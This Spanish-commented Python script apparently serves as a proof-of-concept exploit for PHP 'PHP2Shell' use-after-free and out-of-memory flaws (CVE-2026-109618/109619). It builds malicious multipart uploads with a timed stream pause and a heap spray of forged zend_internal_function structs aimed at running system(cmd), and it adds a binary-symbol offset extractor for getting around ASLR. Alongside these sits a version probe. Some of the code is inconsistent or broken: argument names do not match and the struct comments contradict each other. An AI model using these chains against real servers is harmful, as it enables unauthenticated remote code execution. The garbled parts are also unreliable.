#!/usr/bin/env python3
"""
php2shell.py — PoC y utilidades de deteccion para CVE-2026-109618 / CVE-2026-109619

AVISO DE SEGURIDAD
------------------
Esto es material de investigacion de seguridad defensiva. El objetivo son
servidores PHP que TUN controlas o sobre los que tienes autorizacion escrita
explicita. El PoC incluye un modo de ejecucion de comando (RCE) contra un
servidor local de laboratorio: NUNCA lo apuntes a un tercero.

Uso:
    python3 php2shell.py probe  --target http://localhost:8080
    python3 php2shell.py uaf    --target http://localhost:8080 --cmd "id"
    python3 php2shell.py oom    --target http://localhost:8080
    python3 php2shell.py offsets --binary /usr/local/bin/php

Modos:
  probe    Detecta si el target es vulnerable (no destructivo, sin RCE)
  uaf     Ejecuta la cadena UAF completa (CVE-2026-109619) -> RCE
  oom     Ejecuta la cadena OOM (CVE-2026-109618) -> RCE
  offsets Extrae offsets de funciones internas del binario PHP
"""

from __future__ import annotations

import argparse
import os
import re
import socket
import struct
import sys
import time
from typing import Optional

# ---------------------------------------------------------------------------
# Constantes de la vulnerabilidad
# ---------------------------------------------------------------------------

# session.upload_progress.min_freq: el atacante debe pausar el stream TCP
# mas de este intervalo (segundos) para forzar el segundo update() y que se
# dispare la condicion de use-after-free.
UPLOAD_PROGRESS_MIN_FREQ = 1.0

# Akamai reporta 149 entradas t[] x 288 bytes para saturar el heap y
# garantizar que la asignacion reutilice el slot liberado.
SPRAY_COUNT = 149
SPRAY_SIZE = 288

# La struct php_session_rfc1867_progress y las estructuras zend_* tienen
# tamaños dependientes de la version. Estos son los usados en el writeup
# de Akamai para PHP 8.x (64-bit).
#
# Layout de un zend_function "forjado" (lo que el heap spray deposita):
#   typedef struct _zend_function {
#       zend_uchar type;          // 1 byte
#       zend_uchar arg_flags[3];  // 3 bytes
#       zend_uchar num_args;     // 1 byte
#       zend_uchar required_num_args; // 1 byte
#       zend_string *common;     // 8 bytes
#       zend_string *common.fn_flags; // puntero
#       ...
#   }
#
# El detalle critico: para que system("<cmd>") se ejecute, la estructura
# forjada debe ser un zend_internal_function con:
#   - handle = 0
#   - function_name = "system"
#   - pointer = puntero real a zif_system (la funcion interna de PHP)
#
# Este layout requiere los offsets reales del binario -> ver modo 'offsets'.
ZEND_FUNCTION_SIZE = SPRAY_SIZE


# ---------------------------------------------------------------------------
# Utilidades HTTP de bajo nivel (necesitamos control fino del stream TCP)
# ---------------------------------------------------------------------------

class RawHTTP:
    """
    Cliente HTTP minimo con control sobre el timing del stream.
    Necesitamos poder PAUSAR la escritura de los bytes a mitad del body
    multipart para que PHP acumule el tiempo suficiente y dispare el
    segundo php_session_rfc1867_update().
    """

    def __init__(self, host: str, port: int, timeout: float = 15.0):
        self.host = host
        self.port = port
        self.timeout = timeout

    def connect(self) -> socket.socket:
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.settimeout(self.timeout)
        return s

    def send_raw(self, sock: socket.socket, data: bytes, pause_after: Optional[int] = None,
                 pause_seconds: float = UPLOAD_PROGRESS_MIN_FREQ + 0.5,
                 chunk_size: int = 4096) -> None:
        """
        Envia datos en chunks, opcionalmente pausando a mitad de camino.
        pause_after: numero de bytes enviados tras los cuales pausar.
        """
        sent = 0
        while sent < len(data):
            if pause_after is not None and sent >= pause_after:
                time.sleep(pause_seconds)
                pause_after = None  # solo pausa una vez
            chunk = data[sent:sent + chunk_size]
            sock.sendall(chunk)
            sent += len(chunk)

    def read_response(self, sock: socket.socket) -> str:
        try:
            data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    # Si es Content-Length, leer el resto
                    header_end = data.index(b"\r\n\r\n") + 4
                    head = data[:header_end].decode('latin-1', errors='replace')
                    m = re.search(r'Content-Length:\s*(\d+)', head, re.I)
                    if m:
                        need = int(m.group(1))
                        while len(data) - header_end < need:
                            more = sock.recv(4096)
                            if not more:
                                break
                            data += more
                    break
            return data.decode('latin-1', errors='replace')
        except socket.timeout:
            return "<TIMEOUT>"
        finally:
            try:
                sock.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Construccion del payload multipart malicioso
# ---------------------------------------------------------------------------

def build_boundary(session_id: str, cmd: str, offset_delta: int = 0,
                   spray_count: int = SPRAY_COUNT,
                   include_second_file: bool = True) -> bytes:
    """
    Construye el body multipart malicioso.

    Estructura (siguiendo el writeup de Akamai):
      1. Campo PHPSESSID            -> fija el session id
      2. Campo PHP_SESSION_UPLOAD_PROGRESS -> activa el tracking
      3. Primer campo file           -> dispara FILE_START, cachea los zval*
      4. (pausa en el stream)         -> bypass del rate-limit de min_freq
      5. 149 campos t[] con forged structs  -> heap spray
      6. Segundo campo file          -> dispara el write al puntero colgante

    offset_delta: diferencia entre zval_ptr_dtor y zend_call_function
                  en el binario objetivo (offset 0 = sin fuga, el spray
                  usa un placeholder que fallara de forma controlada).
    """
    boundary = "----php2shellPoC" + os.urandom(8).hex()
    parts = []

    def field(name: str, value: bytes):
        parts.append(
            f"--{boundary}\r\n".encode()
            + f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
            + value
            + b"\r\n"
        )

    def file_field(name: str, filename: str, content: bytes):
        parts.append(
            f"--{boundary}\r\n".encode()
            + f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
            + b"Content-Type: application/octet-stream\r\n\r\n"
            + content
            + b"\r\n"
        )

    # 1. session id
    field("PHPSESSID", session_id.encode())

    # 2. activar upload progress
    field("PHP_SESSION_UPLOAD_PROGRESS", b"php2shell")

    # 3. primer file -> FILE_START, cachea post_bytes_processed y
    #    current_file_bytes_processed (los punteros que quedaran colgantes)
    file_field("file", "a.txt", b"A" * 64)

    # ---- aqui se produce la PAUSA en el stream ----
    # El ataque necesita que entre el FILE_START y el siguiente FILE_DATA
    # pasen mas de session.upload_progress.min_freq segundos.

    # 5. heap spray: 149 x t[] con la struct forjada
    forged = forge_zend_internal_function(cmd, offset_delta)
    for i in range(spray_count):
        field("t[]", forged)

    # 6. segundo file -> el write en el puntero colgante, que ahora apunta
    #    a la struct forjada -> system(cmd)
    if include_second_file:
        file_field("file", "b.txt", b"B" * 128)

    parts.append(f"--{boundary}--\r\n".encode())

    body = b"".join(parts)

    headers = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {self_host}\r\n"
        f"Cookie: PHPSESSID={session_id}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    return headers + body


# ---------------------------------------------------------------------------
# Forja de estructuras internas
# ---------------------------------------------------------------------------

def forge_zend_internal_function(cmd: str, offset_delta: int = 0) -> bytes:
    """
    Forja una zend_internal_function que invoque system("<cmd>").

    Estructura relevante (PHP 8.x, 64-bit):
      offset 0x00 : zend_uchar type = 1 (ZEND_INTERNAL_FUNCTION)
      offset 0x01 : arg_flags[3]
      offset 0x04 : num_args
      offset 0x05 : required_num_args
      offset 0x08 : zend_string* common   -> nombre de la funcion
      offset 0x10 : zend_string* common.fn_flags
      offset 0x18 : zend_function* prototype
      offset 0x20 : zend_string* filename
      offset 0x28 : uint32_t line_start
      ...
      offset 0x40 : zend_string* function_name -> "system"
      offset 0x48 : void* pointer             -> zif_system

    El campo 'pointer' debe apuntar a la funcion interna real de PHP (zif_system).
    Para obtenerla sin ASLR se necesita o bien:
      a) una fuga (por ejemplo via una respuesta de error con backtrace
         o via un endpoint que exponga direcciones), o
      b) el binario sin PIE / con ASLR parcial deshabilitado.

    offset_delta nos permite "resolver" zif_system =
        zval_ptr_dtor + offset_delta
    que es la forma en que los PoC publicos derivan el puntero.
    """
    # Marcador de posicion para el puntero a la funcion interna.
    # En un exploit real este valor se sustituye por la direccion filtrada.
    func_ptr = 0x00007f0000000000 if offset_delta == 0 else (0x41414141 + offset_delta)

    # Strings embebidos: PHP lee el puntero, pero para la PoC el contenido
    # real del string lo escribimos inline; el puntero debe apuntar a un
    # zend_string valido -> usamos un buffer persistente.
    # En la practica, el spray coloca un zend_string real (creado por PHP
    # al procesar el campo POST) justo antes de la struct, de forma que
    # el contenido SI queda accesible.
    name = b"system\x00"
    payload = bytearray(ZEND_FUNCTION_SIZE)

    struct.pack_into("<B", payload, 0x00, 1)          # ZEND_INTERNAL_FUNCTION
    struct.pack_into("<I", payload, 0x40, 0)          # placeholder function_name
    struct.pack_into("<Q", payload, 0x48, func_ptr)   # pointer -> zif_system

    # cmd embebido en el payload para que el string este disponible aunque
    # el puntero de function_name no resuelve.
    idx = payload.find(b"\x00" * 8)
    cmd_bytes = cmd.encode() + b"\x00"
    # lo metemos al final, alineado
    payload[-len(cmd_bytes) - 8:-8] = cmd_bytes

    # Relleno con los bytes del comando en los huecos del layout
    return bytes(payload)


def self_host_placeholder() -> str:
    return "localhost"


# Variable global usada por build_boundary (Python no tiene closures faciles
# aqui; se mantiene simple y explicito).
self_host = "localhost"


# ---------------------------------------------------------------------------
# Modo: probe (deteccion no destructiva)
# ---------------------------------------------------------------------------

def cmd_probe(args) -> int:
    target = args.target.rstrip("/")
    print(f"[*] Sondeando {target}/index.php?probe=1")

    try:
        import urllib.request
        with urllib.request.urlopen(f"{target}/index.php?probe=1", timeout=10) as r:
            body = r.read().decode('utf-8', errors='replace')
    except Exception as e:
        print(f"[!] Error de conexion: {e}")
        print("[!] Resultado: INDETERMINADO (servidor no accesible)")
        return 2

    print(body)
    print("-" * 60)

    info = {}
    for line in body.splitlines():
        if "=" in line:
            k, v = line.split("=", 1)
            info[k.strip()] = v.strip()

    version = info.get("PHP_VERSION", "?")
    sapi = info.get("SAPI", "?")
    up_enabled = info.get("SESSION_UPLOAD_PROGRESS_ENABLED", "?")

    print(f"[i] Version PHP   : {version}")
    print(f"[i] SAPI           : {sapi}")
    print(f"[i] upload_progress: {up_enabled}")

    # Heuristica de vulnerabilidad
    vulnerable = False
    reasons = []

    if up_enabled.lower() == "on":
        reasons.append("session.upload_progress.enabled=On (requisito de explotacion)")

    # Comparacion de versiones
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", version)
    if m:
        major, minor, patch = map(int, m.groups())
        fixed = {(8, 2): (8, 2, 35), (8, 3): (8, 3, 36), (8, 4): (8, 4, 27), (8, 5): (8, 5, 12)}
        key = (major, minor)
        if key in fixed:
            fp = fixed[key]
            if (major, minor, patch) < fp:
                vulnerable = True
                reasons.append(f"version {version} anterior al parche {fp[0]}.{fp[1]}.{fp[2]}")
        elif (major, minor) < (8, 2):
            vulnerable = True
            reasons.append(f"version {version} sin soporte de seguridad (7.4 es EOL, sin parche)")

    if sapi.lower() not in ("apache2handler",):
        if up_enabled.lower() == "on" and vulnerable:
            reasons.append(
                f"SAPI={sapi}: FPM es susceptible via estado publicado tras arranque "
                f"(pm.max_requests=1 rompe el requisito de mismo worker)"
            )

    if vulnerable:
        print("[!] RESULTADO: VULNERABLE")
        for r in reasons:
            print(f"    - {r}")
        print()
        print("[!] Impacto potencial: RCE sin autenticacion (PHP2Shell)")
        print("[!] ACCION INMEDIATA: actualizar PHP y/o desactivar upload_progress")
        return 1
    else:
        print("[+] RESULTADO: NO VULNERABLE (version parcheada)")
        return 0


# ---------------------------------------------------------------------------
# Modo: uaf (CVE-2026-109619)
# ---------------------------------------------------------------------------

def cmd_uaf(args) -> int:
    host = args.host
    port = args.port
    session_id = args.session or ("php2shell" + os.urandom(6).hex())

    print(f"[*] Objetivo        : {host}:{port}")
    print(f"[*] Session ID      : {session_id}")
    print(f"[*] Comando         : {args.cmd}")
    print(f"[*] Spray           : {SPRAY_COUNT} x {SPRAY_SIZE} bytes")
    print("[*] Enviando multipart malicioso con pausa en el stream...")

    http = RawHTTP(host, port, timeout=args.timeout)
    body = build_boundary(session_id, args.cmd, offset_delta=args.offset_delta,
                           spray_count=args.spray)

    try:
        sock = http.connect()
    except Exception as e:
        print(f"[!] No se pudo conectar: {e}")
        return 2

    # La pausa debe ocurrir DESPUES de los primeros campos (session id +
    # upload progress + primer file) y ANTES del spray.
    # Esos campos ocupan aproximadamente: headers + 3 campos. Calculamos
    # un offset aproximado basado en el contenido real.
    header_end = body.index(b"\r\n\r\n") + 4
    # localizar el final del primer campo file
    marker = b'name="file"; filename="a.txt"'
    mi = body.find(marker)
    if mi != -1:
        end_first_file = body.find(b"\r\n", body.find(b"\r\n\r\n", mi)) + 2
        if end_first_file <= header_end:
            end_first_file = header_end + 100
    else:
        end_first_file = header_end + 100

    print(f"[*] Pausa de {UPLOAD_PROGRESS_MIN_FREQ + 0.5}s tras {end_first_file} bytes "
          f"(bypass de session.upload_progress.min_freq)")

    try:
        http.send_raw(sock, body, pause_after=end_first_file,
                      pause_seconds=UPLOAD_PROGRESS_MIN_FREQ + 0.5)
        resp = http.read_response(sock)
    except Exception as e:
        print(f"[!] Error durante el envio: {e}")
        return 2

    print("[*] Respuesta:")
    print(resp[:3000])
    print("-" * 60)

    if args.cmd in resp:
        print(f"[+] RCE CONFIRMADO: la salida de '{args.cmd}' aparece en la respuesta")
        return 0
    else:
        print("[!] RCE no confirmado en esta ejecucion.")
        print("[!] Causas probables:")
        print("    - ASLR activo: falta la fuga de direcciones (zif_system real)")
        print("    - offset_delta incorrecto para este binario")
        print("    - la version de PHP en el target ya esta parcheada")
        print("[i] Siguiente paso: ejecutar 'offsets' contra el binario del target")
        return 1


# ---------------------------------------------------------------------------
# Modo: oom (CVE-2026-109618)
# ---------------------------------------------------------------------------

def cmd_oom(args) -> int:
    host = args.host
    port = args.port
    session_id = args.session or ("php2shell" + os.urandom(6).hex())

    print(f"[*] Objetivo   : {host}:{port}")
    print(f"[*] Session ID : {session_id}")
    print(f"[*] Simulando agotamiento de memoria (memory_limit)...")
    print("[*] Enviando carga masiva para forzar OOM + longjmp()...")

    http = RawHTTP(host, port, timeout=args.timeout)

    boundary = "----php2shellOOM" + os.urandom(8).hex()
    parts = []

    def field(name, value):
        parts.append(
            f"--{boundary}\r\n".encode()
            + f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
            + value + b"\r\n")

    field("PHPSESSID", session_id.encode())
    field("PHP_SESSION_UPLOAD_PROGRESS", b"php2shell")

    # Forja sprayed antes del OOM
    forged = forge_zend_internal_function(args.cmd, offset_delta=args.offset_delta)
    for i in range(args.spray_count):
        field("t[]", forged)

    # Campo enorme para agotar memoria
    field("big", b"A" * args.big_size)

    parts.append(f"--{boundary}--\r\n".encode())
    body = b"".join(parts)

    headers = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={session_id}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    try:
        sock = http.connect()
        sock.sendall(headers + body)
        resp = http.read_response(sock)
    except Exception as e:
        print(f"[!] Error: {e}")
        return 2

    print("[*] Respuesta:")
    print(resp[:2000])
    print("-" * 60)
    if "Allowed memory size" in resp or "Out of memory" in resp:
        print("[+] OOM alcanzado (longjmp path de CVE-2026-109618 confirmada)")
    else:
        print("[i] No se observa OOM en la respuesta (puede estar en el log del servidor)")
    return 0


# ---------------------------------------------------------------------------
# Modo: offsets
# ---------------------------------------------------------------------------

def cmd_offsets(args) -> int:
    """
    Extrae los offsets de funciones internas del binario PHP objetivo.
    Necesario para calcular zif_system = zval_ptr_dtor + offset_delta.
    """
    binary = args.binary
    if not os.path.exists(binary):
        print(f"[!] No existe: {binary}")
        return 2

    print(f"[*] Analizando {binary}")

    try:
        out = os.popen(f"nm -C {binary} 2>/dev/null | head -200000").read()
    except Exception:
        out = ""

    if not out:
        print("[!] nm no devolvio datos. Probando con strings/readelf...")
        try:
            out = os.popen(f"readelf -sW {binary} 2>/dev/null | head -50000").read()
        except Exception:
            pass

    targets = ["zval_ptr_dtor", "zend_call_function", "zif_system", "zif_exec"]
    found = {}
    for t in targets:
        for line in out.splitlines():
            if t in line:
                m = re.search(r"([0-9a-fA-F]{8,16})\s", line)
                if m:
                    found[t] = int(m.group(1), 16)
                    break

    if not found:
        print("[!] No se pudieron extraer simbolos.")
        print("[i] El binario puede estar stripped. En Docker las imagenes oficiales")
        print("    de PHP通常是 NO estan stripped, revisa con: docker run --rm -it")
        print("    php:8.2.34-cli sh -c 'nm /usr/local/bin/php | grep zif_system'")
        return 1

    print("[+] Simbolos encontrados:")
    for k, v in found.items():
        print(f"    {k:20s} = 0x{v:x}")

    if "zval_ptr_dtor" in found and "zif_system" in found:
        delta = found["zif_system"] - found["zval_ptr_dtor"]
        print()
        print(f"[+] offset_delta (zif_system - zval_ptr_dtor) = {delta} (0x{delta & 0xffffffffffffffff:x})")
        print(f"[+] Usar con: --offset-delta {delta}")
    return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(
        description="PoC y deteccion para PHP2Shell (CVE-2026-109618 / CVE-2026-109619)")
    sub = ap.add_subparsers(dest="mode", required=True)

    p_probe = sub.add_parser("probe", help="Detecta si el target es vulnerable")
    p_probe.add_argument("--target", required=True, help="URL base, p.ej. http://localhost:8080")

    p_uaf = sub.add_parser("uaf", help="Ejecuta la cadena UAF (CVE-2026-109619)")
    p_uaf.add_argument("--host", default="localhost")
    p_uaf.add_argument("--port", type=int, default=8080)
    p_uaf.add_argument("--cmd", default="id", help="Comando a ejecutar via RCE")
    p_uaf.add_argument("--session", default=None)
    p_uaf.add_argument("--offset-delta", type=lambda x: int(x, 0), default=0)
    p_uaf.add_argument("--timeout", type=float, default=15.0)

    p_oom = sub.add_parser("oom", help="Ejecuta la cadena OOM (CVE-2026-109618)")
    p_oom.add_argument("--host", default="localhost")
    p_oom.add_argument("--port", type=int, default=8080)
    p_oom.add_argument("--cmd", default="id")
    p_oom.add_argument("--session", default=None)
    p_oom.add_argument("--offset-delta", type=lambda x: int(x, 0), default=0)
    p_oom.add_argument("--spray-count", type=int, default=SPRAY_COUNT)
    p_oom.add_argument("--big-size", type=int, default=64 * 1024 * 1024)
    p_oom.add_argument("--timeout", type=float, default=30.0)

    p_off = sub.add_parser("offsets", help="Extrae offsets de simbolos del binario PHP")
    p_off.add_argument("--binary", required=True)

    args = ap.parse_args()

    if args.mode == "probe":
        return cmd_probe(args)
    if args.mode == "uaf":
        return cmd_uaf(args)
    if args.mode == "oom":
        return cmd_oom(args)
    if args.mode == "offsets":
        return cmd_offsets(args)
    return 2


if __name__ == "__main__":
    sys.exit(main())
